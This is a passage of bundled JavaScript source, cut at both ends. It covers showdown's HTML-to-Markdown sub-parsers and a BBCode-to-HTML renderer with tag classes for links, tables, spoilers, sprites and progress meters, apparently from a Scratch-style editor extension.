          txt = showdown.subParser("makeMarkdown.header")(node, globals, 2) + "\n\n";
        }
        break;
      case "h3":
        if (!spansOnly) {
          txt = showdown.subParser("makeMarkdown.header")(node, globals, 3) + "\n\n";
        }
        break;
      case "h4":
        if (!spansOnly) {
          txt = showdown.subParser("makeMarkdown.header")(node, globals, 4) + "\n\n";
        }
        break;
      case "h5":
        if (!spansOnly) {
          txt = showdown.subParser("makeMarkdown.header")(node, globals, 5) + "\n\n";
        }
        break;
      case "h6":
        if (!spansOnly) {
          txt = showdown.subParser("makeMarkdown.header")(node, globals, 6) + "\n\n";
        }
        break;
      case "p":
        if (!spansOnly) {
          txt = showdown.subParser("makeMarkdown.paragraph")(node, globals) + "\n\n";
        }
        break;
      case "blockquote":
        if (!spansOnly) {
          txt = showdown.subParser("makeMarkdown.blockquote")(node, globals) + "\n\n";
        }
        break;
      case "hr":
        if (!spansOnly) {
          txt = showdown.subParser("makeMarkdown.hr")(node, globals) + "\n\n";
        }
        break;
      case "ol":
        if (!spansOnly) {
          txt = showdown.subParser("makeMarkdown.list")(node, globals, "ol") + "\n\n";
        }
        break;
      case "ul":
        if (!spansOnly) {
          txt = showdown.subParser("makeMarkdown.list")(node, globals, "ul") + "\n\n";
        }
        break;
      case "precode":
        if (!spansOnly) {
          txt = showdown.subParser("makeMarkdown.codeBlock")(node, globals) + "\n\n";
        }
        break;
      case "pre":
        if (!spansOnly) {
          txt = showdown.subParser("makeMarkdown.pre")(node, globals) + "\n\n";
        }
        break;
      case "table":
        if (!spansOnly) {
          txt = showdown.subParser("makeMarkdown.table")(node, globals) + "\n\n";
        }
        break;
      case "code":
        txt = showdown.subParser("makeMarkdown.codeSpan")(node, globals);
        break;
      case "em":
      case "i":
        txt = showdown.subParser("makeMarkdown.emphasis")(node, globals);
        break;
      case "strong":
      case "b":
        txt = showdown.subParser("makeMarkdown.strong")(node, globals);
        break;
      case "del":
        txt = showdown.subParser("makeMarkdown.strikethrough")(node, globals);
        break;
      case "a":
        txt = showdown.subParser("makeMarkdown.links")(node, globals);
        break;
      case "img":
        txt = showdown.subParser("makeMarkdown.image")(node, globals);
        break;
      default:
        txt = node.outerHTML + "\n\n";
    }
    return txt;
  });
  showdown.subParser("makeMarkdown.paragraph", function(node, globals) {
    "use strict";
    var txt = "";
    if (node.hasChildNodes()) {
      var children = node.childNodes, childrenLength = children.length;
      for (var i = 0; i < childrenLength; ++i) {
        txt += showdown.subParser("makeMarkdown.node")(children[i], globals);
      }
    }
    txt = txt.trim();
    return txt;
  });
  showdown.subParser("makeMarkdown.pre", function(node, globals) {
    "use strict";
    var num = node.getAttribute("prenum");
    return "<pre>" + globals.preList[num] + "</pre>";
  });
  showdown.subParser("makeMarkdown.strikethrough", function(node, globals) {
    "use strict";
    var txt = "";
    if (node.hasChildNodes()) {
      txt += "~~";
      var children = node.childNodes, childrenLength = children.length;
      for (var i = 0; i < childrenLength; ++i) {
        txt += showdown.subParser("makeMarkdown.node")(children[i], globals);
      }
      txt += "~~";
    }
    return txt;
  });
  showdown.subParser("makeMarkdown.strong", function(node, globals) {
    "use strict";
    var txt = "";
    if (node.hasChildNodes()) {
      txt += "**";
      var children = node.childNodes, childrenLength = children.length;
      for (var i = 0; i < childrenLength; ++i) {
        txt += showdown.subParser("makeMarkdown.node")(children[i], globals);
      }
      txt += "**";
    }
    return txt;
  });
  showdown.subParser("makeMarkdown.table", function(node, globals) {
    "use strict";
    var txt = "", tableArray = [[], []], headings = node.querySelectorAll("thead>tr>th"), rows = node.querySelectorAll("tbody>tr"), i, ii;
    for (i = 0; i < headings.length; ++i) {
      var headContent = showdown.subParser("makeMarkdown.tableCell")(headings[i], globals), allign = "---";
      if (headings[i].hasAttribute("style")) {
        var style = headings[i].getAttribute("style").toLowerCase().replace(/\s/g, "");
        switch (style) {
          case "text-align:left;":
            allign = ":---";
            break;
          case "text-align:right;":
            allign = "---:";
            break;
          case "text-align:center;":
            allign = ":---:";
            break;
        }
      }
      tableArray[0][i] = headContent.trim();
      tableArray[1][i] = allign;
    }
    for (i = 0; i < rows.length; ++i) {
      var r = tableArray.push([]) - 1, cols = rows[i].getElementsByTagName("td");
      for (ii = 0; ii < headings.length; ++ii) {
        var cellContent = " ";
        if (typeof cols[ii] !== "undefined") {
          cellContent = showdown.subParser("makeMarkdown.tableCell")(cols[ii], globals);
        }
        tableArray[r].push(cellContent);
      }
    }
    var cellSpacesCount = 3;
    for (i = 0; i < tableArray.length; ++i) {
      for (ii = 0; ii < tableArray[i].length; ++ii) {
        var strLen = tableArray[i][ii].length;
        if (strLen > cellSpacesCount) {
          cellSpacesCount = strLen;
        }
      }
    }
    for (i = 0; i < tableArray.length; ++i) {
      for (ii = 0; ii < tableArray[i].length; ++ii) {
        if (i === 1) {
          if (tableArray[i][ii].slice(-1) === ":") {
            tableArray[i][ii] = showdown.helper.padEnd(tableArray[i][ii].slice(-1), cellSpacesCount - 1, "-") + ":";
          } else {
            tableArray[i][ii] = showdown.helper.padEnd(tableArray[i][ii], cellSpacesCount, "-");
          }
        } else {
          tableArray[i][ii] = showdown.helper.padEnd(tableArray[i][ii], cellSpacesCount);
        }
      }
      txt += "| " + tableArray[i].join(" | ") + " |\n";
    }
    return txt.trim();
  });
  showdown.subParser("makeMarkdown.tableCell", function(node, globals) {
    "use strict";
    var txt = "";
    if (!node.hasChildNodes()) {
      return "";
    }
    var children = node.childNodes, childrenLength = children.length;
    for (var i = 0; i < childrenLength; ++i) {
      txt += showdown.subParser("makeMarkdown.node")(children[i], globals, true);
    }
    return txt.trim();
  });
  showdown.subParser("makeMarkdown.txt", function(node) {
    "use strict";
    var txt = node.nodeValue;
    txt = txt.replace(/ +/g, " ");
    txt = txt.replace(/¨NBSP;/g, " ");
    txt = txt.replace(/([*_~|`])/g, "\\$1");
    txt = txt.replace(/^(\s*)>/g, "\\$1>");
    txt = txt.replace(/^#/gm, "\\#");
    txt = txt.replace(/^(\s*)([-=]{3,})(\s*)$/, "$1\\$2$3");
    txt = txt.replace(/^( {0,3}\d+)\./gm, "$1\\.");
    txt = txt.replace(/^( {0,3})([+-])/gm, "$1\\$2");
    txt = txt.replace(/]([\s]*)\(/g, "\\]$1\\(");
    txt = txt.replace(/^ {0,3}\[([\S \t]*?)]:/gm, "\\[$1]:");
    return txt;
  });
  var MarkDown_default = showdown;

  // src/module/bbcode.js
  var obj = window || global || {};
  var runtime;
  (function() {
    this.bbcode = {};
  }).call(obj);
  (function() {
    let _COSMETIC_DICT;
    let _COSMETIC_RE;
    let _ESCAPE_DICT;
    let _ESCAPE_RE;
    let _URL_RE;
    let bbcode2;
    let key;
    const { slice } = [];
    _ESCAPE_RE = /[&<>"]/g;
    _ESCAPE_DICT = {
      "&": "&amp;",
      "<": "&lt;",
      ">": "&gt;",
      '"': "&quot;"
    };
    _URL_RE = /\b((?:([\w-]+):(\/{1,3})|www[.])(?:(?:(?:[^\s&()]|&amp;|&quot;)*(?:[^!"#$%&'()*+,.:;<=>?@\[\]^`{|}~\s]))|(?:\((?:[^\s&()]|&amp;|&quot;)*\)))+)/g;
    _COSMETIC_DICT = {
      "--": "&ndash;",
      "---": "&mdash;",
      "...": "&#8230;",
      "(c)": "&copy;",
      "(reg)": "&reg;",
      "(tm)": "&trade;"
    };
    _COSMETIC_RE = new RegExp(
      function() {
        let results;
        results = [];
        for (key in _COSMETIC_DICT) {
          results.push(key.replace(/(\.|\)|\()/g, "\\$1"));
        }
        return results;
      }().join("|")
    );
    bbcode2 = this.bbcode;
    this.bbcode.Renderer = function() {
      function Renderer(options) {
        options = options || {};
        this._contexts = [];
        this.options = {
          linkify: !!options.linkify
        };
      }
      Renderer.prototype.context = function(context, func) {
        let k;
        let newOptions;
        let ref;
        let v;
        newOptions = {};
        ref = this.options;
        for (k in ref) {
          v = ref[k];
          newOptions[k] = v;
        }
        for (k in context) {
          v = context[k];
          newOptions[k] = v;
        }
        this._contexts.push(this.options);
        this.options = newOptions;
        v = func();
        this.options = this._contexts.pop();
        return v;
      };
      Renderer.prototype.escape = function(value) {
        return value.replace(_ESCAPE_RE, function(match) {
          return _ESCAPE_DICT[match];
        });
      };
      Renderer.prototype.linkify = function(value) {
        return value.replace(_URL_RE, function() {
          let href;
          let match;
          let proto;
          let url;
          match = arguments.length >= 1 ? slice.call(arguments, 0) : [];
          url = match[1];
          proto = match[2];
          if (proto && proto !== "http" && proto !== "https") {
            return url;
          }
          href = match[1];
          if (!proto) {
            href = `http://${href}`;
          }
          return `<a href="${href}" target="_blank">${url}</a>`;
        });
      };
      Renderer.prototype.strip = function(text) {
        return text.replace(/^\s+|\s+$/g, "");
      };
      Renderer.prototype.cosmeticReplace = function(value) {
        return value.replace(_COSMETIC_RE, function() {
          let item;
          let match;
          match = arguments.length >= 1 ? slice.call(arguments, 0) : [];
          item = match[0];
          return _COSMETIC_DICT[item] || item;
        });
      };
      Renderer.prototype.htmlAttributes = function(attributes) {
        let k;
        let v;
        if (!attributes) {
          return "";
        }
        return function() {
          let results;
          results = [];
          for (k in attributes) {
            v = attributes[k];
            results.push(`${k}="${v}"`);
          }
          return results;
        }().join(" ");
      };
      return Renderer;
    }();
  }).call(obj);
  (function() {
    let CenterTag;
    let CodeTag;
    let ColorTag;
    let HorizontalRuleTag;
    let ImageTag;
    let LinkTag;
    let EmailTag;
    let FontTag;
    let BGcolorTag;
    let SpolierTag;
    let HideTag;
    let SpriteTag;
    let MeterTag;
    let ListItemTag;
    let ListTag;
    let TableTag;
    let TrTag;
    let TdTag;
    let DIVTag;
    let QuoteTag;
    let RightTag;
    let SizeTag;
    let MarkDownTag;
    let _LINE_BREAK;
    let _NEWLINE_RE;
    let bbcode2;
    const indexOf = [].indexOf || function(item) {
      for (let i = 0, l = this.length; i < l; i++) {
        if (i in this && this[i] === item)
          return i;
      }
      return -1;
    };
    const extend = function(child, parent) {
      for (const key in parent) {
        if (hasProp.call(parent, key))
          child[key] = parent[key];
      }
      function ctor() {
        this.constructor = child;
      }
      ctor.prototype = parent.prototype;
      child.prototype = new ctor();
      child.__super__ = parent.prototype;
      return child;
    };
    var hasProp = {}.hasOwnProperty;
    _NEWLINE_RE = /\r?\n/g;
    _LINE_BREAK = "<br />";
    bbcode2 = this.bbcode;
    this.bbcode.Tag = function() {
      function Tag(renderer, settings) {
        let i;
        let key;
        let len;
        let ref;
        let ref1;
        let value;
        this.renderer = renderer;
        if (settings == null) {
          settings = {};
        }
        this.CLOSED_BY = [];
        this.SELF_CLOSE = false;
        this.STRIP_INNER = false;
        this.STRIP_OUTER = false;
        this.DISCARD_TEXT = false;
        this.name = settings.name || null;
        this.parent = settings.parent || null;
        this.text = settings.text || "";
        if (this.parent) {
          this.parent.children.push(this);
        }
        if (settings.params == null) {
          settings.params = [];
        }
        this.params = {};
        ref = settings.params;
        for (i = 0, len = ref.length; i < len; i++) {
          ref1 = ref[i], key = ref1[0], value = ref1[1];
          if (value) {
            this.params[key] = this.renderer.escape(value);
          }
        }
        this.children = [];
      }
      Tag.prototype.getContent = function(raw) {
        let child;
        let children;
        let content;
        let i;
        let len;
        let pieces;
        let text;
        if (raw === void 0) {
          raw = false;
        }
        pieces = [];
        if (this.text) {
          text = this.renderer.escape(this.text);
          if (raw === false) {
            if (this.renderer.options.linkify) {
              text = this.renderer.linkify(text);
            }
            text = this.renderer.cosmeticReplace(text.replace(_NEWLINE_RE, _LINE_BREAK));
          }
          pieces.push(text);
        }
        children = this.children;
        for (i = 0, len = children.length; i < len; i++) {
          child = children[i];
          if (raw) {
            pieces.push(child.toText());
          } else {
            if (this.DISCARD_TEXT && child.name === null) {
              continue;
            }
            pieces.push(child.toHTML());
          }
        }
        content = pieces.join("");
        if (!raw && this.STRIP_INNER) {
          content = this.renderer.strip(content);
          while (content.slice(0, _LINE_BREAK.length) === _LINE_BREAK) {
            content = content.slice(_LINE_BREAK.length);
          }
          while (content.slice(-_LINE_BREAK.length) === _LINE_BREAK) {
            content = content.slice(0, -_LINE_BREAK.length);
          }
          content = this.renderer.strip(content);
        }
        return content;
      };
      Tag.prototype.toText = function(contentAsHTML) {
        let k;
        let params;
        let pieces;
        let ref;
        let v;
        if (contentAsHTML == null) {
          contentAsHTML = false;
        }
        pieces = [];
        if (this.name !== null) {
          if (this.params.length) {
            params = function() {
              let ref2;
              let results;
              ref2 = this.params;
              results = [];
              for (k in ref2) {
                v = ref2[k];
                results.push([k, v].join("="));
              }
              return results;
            }.call(this).join(" ");
            if (this.name in this.params) {
              pieces.push(`[${params}]`);
            } else {
              pieces.push(`[${this.name} ${params}]`);
            }
          } else {
            pieces.push(`[${this.name}]`);
          }
        }
        pieces.push(this.getContent(!contentAsHTML));
        if (this.name !== null && (ref = this.name, indexOf.call(this.CLOSED_BY, ref) < 0)) {
          pieces.push(`[/${this.name}]`);
        }
        return pieces.join("");
      };
      Tag.prototype._toHTML = function() {
        return this.toText(true);
      };
      Tag.prototype.toHTML = function() {
        let pieces;
        pieces = this._toHTML();
        if (typeof pieces === "string") {
          return pieces;
        }
        return pieces.join("");
      };
      return Tag;
    }();
    CodeTag = function(superClass) {
      extend(CodeTag2, superClass);
      function CodeTag2() {
        CodeTag2.__super__.constructor.apply(this, arguments);
        this.STRIP_INNER = true;
        this._inline = this.params.code === "inline";
        if (!this._inline) {
          this.STRIP_OUTER = true;
        }
      }
      CodeTag2.prototype._toHTML = function() {
        let lang;
        lang = this.params.lang || this.params[this.name];
        if (lang) {
          return [
            `<code><pre class="prettyprint lang-${lang}" style="background: none;">`,
            this.getContent(true),
            "</pre></code>"
          ];
        }
        return ['<code><pre style="background: none;">', this.getContent(true), "</pre></code>"];
      };
      return CodeTag2;
    }(this.bbcode.Tag);
    ImageTag = function(superClass) {
      extend(ImageTag2, superClass);
      function ImageTag2() {
        return ImageTag2.__super__.constructor.apply(this, arguments);
      }
      ImageTag2.prototype._toHTML = function() {
        let attributes;
        attributes = {
          src: this.renderer.strip(this.getContent(true))
        };
        if ("width" in this.params) {
          attributes.width = this.params.width;
        }
        if ("height" in this.params) {
          attributes.height = this.params.height;
        }
        return `<img ${this.renderer.htmlAttributes(attributes)} />`;
      };
      return ImageTag2;
    }(this.bbcode.Tag);
    SizeTag = function(superClass) {
      extend(SizeTag2, superClass);
      function SizeTag2() {
        return SizeTag2.__super__.constructor.apply(this, arguments);
      }
      SizeTag2.prototype._toHTML = function() {
        let size;
        size = this.params.size;
        if (isNaN(size)) {
          return this.getContent();
        }
        return [`<span style="font-size:${size}px;">`, this.getContent(), "</span>"];
      };
      return SizeTag2;
    }(this.bbcode.Tag);
    MarkDownTag = function(superClass) {
      extend(MarkDownTag2, superClass);
      function MarkDownTag2() {
        return MarkDownTag2.__super__.constructor.apply(this, arguments);
      }
      MarkDownTag2.prototype._toHTML = function() {
        const converter = new MarkDown_default.Converter();
        let mode = this.params[this.name];
        let style = this.params["style"];
        return [`<span style="${style}">`, converter.makeHtml(String(this.getContent(Boolean(mode) ? true : void 0).replace(/<br\s*\/?>/g, "\n"))), "</span>"];
      };
      return MarkDownTag2;
    }(this.bbcode.Tag);
    ColorTag = function(superClass) {
      extend(ColorTag2, superClass);
      function ColorTag2() {
        return ColorTag2.__super__.constructor.apply(this, arguments);
      }
      ColorTag2.prototype._toHTML = function() {
        let color;
        color = this.params.color;
        if (color != null) {
          return [`<color style="color:${color}">`, this.getContent(), "</color>"];
        }
        return this.getContent();
      };
      return ColorTag2;
    }(this.bbcode.Tag);
    CenterTag = function(superClass) {
      extend(CenterTag2, superClass);
      function CenterTag2() {
        return CenterTag2.__super__.constructor.apply(this, arguments);
      }
      CenterTag2.prototype._toHTML = function() {
        return ['<div style="text-align:center;">', this.getContent(), "</div>"];
      };
      return CenterTag2;
    }(this.bbcode.Tag);
    RightTag = function(superClass) {
      extend(RightTag2, superClass);
      function RightTag2() {
        return RightTag2.__super__.constructor.apply(this, arguments);
      }
      RightTag2.prototype._toHTML = function() {
        return ['<div style="float:right;">', this.getContent(), "</div>"];
      };
      return RightTag2;
    }(this.bbcode.Tag);
    HorizontalRuleTag = function(superClass) {
      extend(HorizontalRuleTag2, superClass);
      function HorizontalRuleTag2() {
        HorizontalRuleTag2.__super__.constructor.apply(this, arguments);
        this.SELF_CLOSE = true;
        this.STRIP_OUTER = true;
      }
      HorizontalRuleTag2.prototype._toHTML = function() {
        return "<hr />";
      };
      return HorizontalRuleTag2;
    }(this.bbcode.Tag);
    ListTag = function(superClass) {
      extend(ListTag2, superClass);
      function ListTag2() {
        ListTag2.__super__.constructor.apply(this, arguments);
        this.STRIP_INNER = true;
        this.STRIP_OUTER = true;
      }
      ListTag2.prototype._toHTML = function() {
        let listType;
        listType = this.params.list;
        if (listType === "1") {
          return ["<ol>", this.getContent(), "</ol>"];
        }
        if (listType === "a") {
          return ['<ol style="list-style-type:lower-alpha;">', this.getContent(), "</ol>"];
        }
        if (listType === "A") {
          return ['<ol style="list-style-type:upper-alpha;">', this.getContent(), "</ol>"];
        }
        return ["<ul>", this.getContent(), "</ul>"];
      };
      return ListTag2;
    }(this.bbcode.Tag);
    ListItemTag = function(superClass) {
      extend(ListItemTag2, superClass);
      function ListItemTag2() {
        ListItemTag2.__super__.constructor.apply(this, arguments);
        this.CLOSED_BY = ["*", "/list"];
        this.STRIP_INNER = true;
      }
      ListItemTag2.prototype._toHTML = function() {
        return ["<li>", this.getContent(), "</li>"];
      };
      return ListItemTag2;
    }(this.bbcode.Tag);
    TableTag = function(superClass) {
      extend(TableTag2, superClass);
      function TableTag2() {
        TableTag2.__super__.constructor.apply(this, arguments);
      }
      TableTag2.prototype._toHTML = function() {
        let style = "";
        let attributes = {};
        if ("cellspacing" in this.params) {
          style += "border-spacing:" + this.params.cellspacing + ";";
        }
        if ("bgcolor" in this.params) {
          style += "background:" + this.params.bgcolor + ";";
        }
        if ("bcolor" in this.params) {
          style += "border-color:" + this.params["bcolor"] + ";";
        }
        if ("bwidth" in this.params) {
          style += "border-width:" + this.params["bwidth"] + ";";
        }
        if ("bstyle" in this.params) {
          style += "border-style:" + this.params["bstyle"] + ";";
        }
        return [`<table class="WitCatBBcodeTable" style="${style}" ${this.renderer.htmlAttributes(attributes)}>`, this.getContent(), "</table>"];
      };
      return TableTag2;
    }(this.bbcode.Tag);
    TrTag = function(superClass) {
      extend(TrTag2, superClass);
      function TrTag2() {
        TrTag2.__super__.constructor.apply(this, arguments);
      }
      TrTag2.prototype._toHTML = function() {
        return ["<tr>", this.getContent(), "</tr>"];
      };
      return TrTag2;
    }(this.bbcode.Tag);
    TdTag = function(superClass) {
      extend(TdTag2, superClass);
      function TdTag2() {
        TdTag2.__super__.constructor.apply(this, arguments);
      }
      TdTag2.prototype._toHTML = function() {
        let style = "";
        let attributes = {};
        if ("rowspan" in this.params) {
          attributes.rowspan = this.params.rowspan;
        }
        if ("colspan" in this.params) {
          attributes.colspan = this.params.colspan;
        }
        if ("bgcolor" in this.params) {
          style += "background:" + this.params.bgcolor + ";";
        }
        if ("bcolor" in this.params) {
          style += "border-color:" + this.params["bcolor"] + ";";
        }
        if ("bwidth" in this.params) {
          style += "border-width:" + this.params["bwidth"] + ";";
        }
        if ("bstyle" in this.params) {
          style += "border-style:" + this.params["bstyle"] + ";";
        }
        if ("style" in this.params) {
          style += this.params["style"];
        }
        return [`<td style="${style}" ${this.renderer.htmlAttributes(attributes)}>`, this.getContent(), "</td>"];
      };
      return TdTag2;
    }(this.bbcode.Tag);
    DIVTag = function(superClass) {
      extend(DIVTag2, superClass);
      function DIVTag2() {
        DIVTag2.__super__.constructor.apply(this, arguments);
      }
      DIVTag2.prototype._toHTML = function() {
        let style = this.params["style"];
        return [`<div style="${style}">`, this.getContent(), "</div>"];
      };
      return DIVTag2;
    }(this.bbcode.Tag);
    QuoteTag = function(superClass) {
      extend(QuoteTag2, superClass);
      function QuoteTag2() {
        QuoteTag2.__super__.constructor.apply(this, arguments);
        this.STRIP_INNER = true;
        this.STRIP_OUTER = true;
      }
      QuoteTag2.prototype._toHTML = function() {
        let citation;
        let pieces;
        pieces = ["<blockquote>", this.getContent()];
        citation = this.params.quote;
        if (citation) {
          pieces.push("<small>");
          pieces.push(citation);
          pieces.push("</small>");
        }
        pieces.push("</blockquote>");
        return pieces;
      };
      return QuoteTag2;
    }(this.bbcode.Tag);
    LinkTag = function(superClass) {
      extend(LinkTag2, superClass);
      function LinkTag2() {
        return LinkTag2.__super__.constructor.apply(this, arguments);
      }
      LinkTag2.prototype._toHTML = function() {
        let url;
        url = this.renderer.strip(this.params[this.name] || this.getContent(true));
        if (/javascript:/i.test(url)) {
          url = "";
        }
        if (url) {
          return this.renderer.context(
            {
              linkify: false
            },
            /* @__PURE__ */ function(_this) {
              return function() {
                return [`<a href="${url}" target="_blank">`, _this.getContent(), "</a>"];
              };
            }(this)
          );
        }
        return this.getContent();
      };
      return LinkTag2;
    }(this.bbcode.Tag);
    EmailTag = function(superClass) {
      extend(EmailTag2, superClass);
      function EmailTag2() {
        return EmailTag2.__super__.constructor.apply(this, arguments);
      }
      EmailTag2.prototype._toHTML = function() {
        let url;
        url = this.renderer.strip(this.params[this.name] || this.getContent(true));
        if (/javascript:/i.test(url)) {
          url = "";
        }
        if (url) {
          return this.renderer.context(
            {
              linkify: false
            },
            /* @__PURE__ */ function(_this) {
              return function() {
                return [`<a href="mailto:${url}" target="_blank">`, _this.getContent(), "</a>"];
              };
            }(this)
          );
        }
        return this.getContent();
      };
      return EmailTag2;
    }(this.bbcode.Tag);
    FontTag = function(superClass) {
      extend(FontTag2, superClass);
      function FontTag2() {
        return FontTag2.__super__.constructor.apply(this, arguments);
      }
      FontTag2.prototype._toHTML = function() {
        let font;
        font = this.params[this.name];
        if (font) {
          return [`<span style="font-family:${font}">`, this.getContent(), "</span>"];
        }
        return this.getContent();
      };
      return FontTag2;
    }(this.bbcode.Tag);
    BGcolorTag = function(superClass) {
      extend(BGcolorTag2, superClass);
      function BGcolorTag2() {
        return BGcolorTag2.__super__.constructor.apply(this, arguments);
      }
      BGcolorTag2.prototype._toHTML = function() {
        let color;
        color = this.params[this.name];
        if (color) {
          return [`<span style="background-color:${color}">`, this.getContent(), "</span>"];
        }
        return this.getContent();
      };
      return BGcolorTag2;
    }(this.bbcode.Tag);
    SpolierTag = function(superClass) {
      extend(SpolierTag2, superClass);
      function SpolierTag2() {
        return SpolierTag2.__super__.constructor.apply(this, arguments);
      }
      SpolierTag2.prototype._toHTML = function() {
        return [`<span class="WitCatBBcodeSpolier" ${this.params.id ? `id="WitCatBBcodeSpolier${this.params.id}"` : ""} ${this.params.height ? `style="height:${Number(this.params.height)}px;" height=${Number(this.params.height)}` : ""}>`, this.getContent(), `${this.params.button ? `<button onclick="showText(this);" style="color:${this.params.button};${this.params.bgcolor ? `background-color:${this.params.bgcolor};` : ""}">${window.localStorage.getItem("xigua_scratch_gui_lang") === "zh-cn" ? "\u5C55\u5F00" : "more"}</button>` : ""}</span>`];
      };
      return SpolierTag2;
    }(this.bbcode.Tag);
    HideTag = function(superClass) {
      extend(HideTag2, superClass);
      function HideTag2() {
        return HideTag2.__super__.constructor.apply(this, arguments);
      }
      HideTag2.prototype._toHTML = function() {
        return [`<span class="WitCatBBcodeHide">`, this.getContent(), `</span>`];
      };
      return HideTag2;
    }(this.bbcode.Tag);
    SpriteTag = function(superClass) {
      extend(SpriteTag2, superClass);
      function SpriteTag2() {
        this.SELF_CLOSE = true;
        return SpriteTag2.__super__.constructor.apply(this, arguments);
      }
      SpriteTag2.prototype._toHTML = function() {
        let attributes = {};
        if ("width" in this.params) {
          attributes.width = this.params.width;
        }
        if ("height" in this.params) {
          attributes.height = this.params.height;
        }
        let svgDataUri = null, num = 0;
        if ("num" in this.params) {
          num = this.params.num - 1;
        }
        const targetSprite = runtime.targets.find((v) => {
          return v.sprite.name === this.params[this.name];
        });
        function Uint8ArrayToString(fileData) {
          var dataString = "";
          for (var i = 0; i < fileData.length; i++) {
            dataString += String.fromCharCode(fileData[i]);
          }
          return dataString;
        }
        if (targetSprite) {
          const targetCostume = targetSprite.sprite.costumes_[num];
          const costumeURL = Uint8ArrayToString(targetCostume.asset.data);
          attributes.src = "data:image/svg+xml;base64," + btoa(costumeURL);
        }
        return [`<img ${this.renderer.htmlAttributes(attributes)}>`, `</span>`];
      };
      return SpriteTag2;
    }(this.bbcode.Tag);
    MeterTag = function(superClass) {
      extend(MeterTag2, superClass);
      function MeterTag2() {
        this.SELF_CLOSE = true;
        return MeterTag2.__super__.constructor.apply(this, arguments);
      }
      MeterTag2.prototype._toHTML = function() {
        let style = "", styles = "";
        let attributes = {};
        let attributess = {};
        if ("width" in this.params) {
          style += "width:" + this.params.width + ";";
        }
        if ("height" in this.params) {
          style += "height:" + this.params.height + ";";
        }
        if ("bgcolor" in this.params) {
          style += "background:" + this.params.bgcolor + ";";
        }
        if ("color" in this.params) {
          styles += "background:" + this.params.color + ";";
        }
        if ("id" in this.params) {
          attributess.id = `WitCatBBcodeMeter${this.params.id}`;
        }
        styles += `width:${this.params[this.name]}%;`;
        attributes.style = style;
        attributess.style = styles;
        return [`<div class="WitCatBBcodeg-container" ${this.renderer.htmlAttributes(attributes)}>`, `<div class="WitCatBBcodeg-progress" ${this.renderer.htmlAttributes(attributess)}></div > `, `</div > `];
      };
      return MeterTag2;
    }(this.bbcode.Tag);
    this.bbcode.createSimpleTag = /* @__PURE__ */ function(_this) {
      return function(name, attributes) {
        let SimpleTag;
        return SimpleTag = function(superClass) {
          extend(SimpleTag2, superClass);
          function SimpleTag2() {
            let k;
            let v;
            SimpleTag2.__super__.constructor.apply(this, arguments);
            for (k in attributes) {
              v = attributes[k];
              this[k] = v;
            }
          }
          SimpleTag2.prototype._toHTML = function() {
            let htmlAttributes;
            htmlAttributes = this.renderer.htmlAttributes(this.params);
            if (htmlAttributes) {
              htmlAttributes = ` ${htmlAttributes}`;
            }
            return [`<${name}${htmlAttributes}>`, this.getContent(), `</${name}>`];
          };
          return SimpleTag2;
        }(_this.bbcode.Tag);
      };
    }(this);
    this.bbcode.BUILTIN = {
      b: this.bbcode.createSimpleTag("strong"),
      i: this.bbcode.createSimpleTag("em"),
      u: this.bbcode.createSimpleTag("u"),
      s: this.bbcode.createSimpleTag("strike"),
      h1: this.bbcode.createSimpleTag("h1", {
        STRIP_OUTER: true
      }),
      h2: this.bbcode.createSimpleTag("h2", {
        STRIP_OUTER: true
      }),
      h3: this.bbcode.createSimpleTag("h3", {
        STRIP_OUTER: true
      }),
      h4: this.bbcode.createSimpleTag("h4", {
        STRIP_OUTER: true
      }),
      h5: this.bbcode.createSimpleTag("h5", {
        STRIP_OUTER: true
      }),
      h6: this.bbcode.createSimpleTag("h6", {
        STRIP_OUTER: true
      }),
      pre: this.bbcode.createSimpleTag("pre"),
      table: this.bbcode.createSimpleTag("table", {
        DISCARD_TEXT: true
      }),
      thead: this.bbcode.createSimpleTag("thead", {
        DISCARD_TEXT: true
      }),
      tbody: this.bbcode.createSimpleTag("tbody", {
        DISCARD_TEXT: true
      }),
      tr: this.bbcode.createSimpleTag("tr", {
        DISCARD_TEXT: true
      }),
      th: this.bbcode.createSimpleTag("th"),
      td: this.bbcode.createSimpleTag("td"),
      code: CodeTag,
      img: ImageTag,
      hr: HorizontalRuleTag,
      size: SizeTag,
      markdown: MarkDownTag,
      md: MarkDownTag,
      center: CenterTag,
      right: RightTag,
      color: ColorTag,
      list: ListTag,
      "*": ListItemTag,
      quote: QuoteTag,
      url: LinkTag,
      link: LinkTag,
      email: EmailTag,
      font: FontTag,
      bgcolor: BGcolorTag,
      spolier: SpolierTag,
      hide: HideTag,
      sprite: SpriteTag,
      meter: MeterTag,
      table: TableTag,
      tr: TrTag,
      td: TdTag,
      div: DIVTag
    };
  }).call(obj);
  (function() {
    let _SPACE_RE;
    let _START_NEWLINE_RE;
    let _TOKEN_RE;
    let bbcode2;
    const indexOf = [].indexOf || function(item) {
      for (let i = 0, l = this.length; i < l; i++) {
        if (i in this && this[i] === item)
          return i;
      }
      return -1;
    };
    _SPACE_RE = /^\s*$/;
    _TOKEN_RE = /(\[\/?.+?\])/;
    _START_NEWLINE_RE = /^\r?\n/;
    bbcode2 = this.bbcode;
    this.bbcode.Parser = function() {
      function Parser(allowedTags) {
        let i;
        let len;
        let name;
        let ref;
        let tag;
        if (allowedTags == null) {
          allowedTags = null;
        }
        this.tags = {};
        if (!allowedTags) {
          ref = bbcode2.BUILTIN;
          for (name in ref) {
            tag = ref[name];
            this.registerTag(name, tag);
          }
        } else {
          for (i = 0, len = allowedTags.length; i < len; i++) {
            name = allowedTags[i];
            if (indexOf.call(bbcode2.BUILTIN, name) >= 0) {
              this.registerTag(name, bbcode2.BUILTIN[name]);
            }
          }
        }
        this.renderer = new bbcode2.Renderer();
      }
      Parser.prototype.registerTag = function(name, tag) {
        return this.tags[name] = tag;
      };
      Parser.prototype._parseParams = function(token) {
        let c;
        let i;
        let key;
        let len;
        let params;
        let skipNext;
        let target;
        let terminate;
        let value;
        params = [];
        if (token) {
          target = key = [];
          value = [];
          terminate = " ";
          skipNext = false;
          for (i = 0, len = token.length; i < len; i++) {
            c = token[i];
            if (skipNext) {
              skipNext = false;
            } else if (target === key && c === "=") {
              target = value;
            } else if (target === key && c === ":") {
              target = value;
            } else if (!value.length && c === '"') {
              terminate = c;
            } else if (c !== terminate) {
              target.push(c);
            } else {
              params.push([key.join("").toLowerCase(), value.join("")]);
              if (!_SPACE_RE.test(terminate)) {
                skipNext = true;
              }
              target = key = [];
              value = [];
              terminate = " ";
            }
          }
          params.push([key.join("").toLowerCase(), value.join("")]);
        }
        return params;
      };
      Parser.prototype._createTextNode = function(parent, text) {
        let ref;
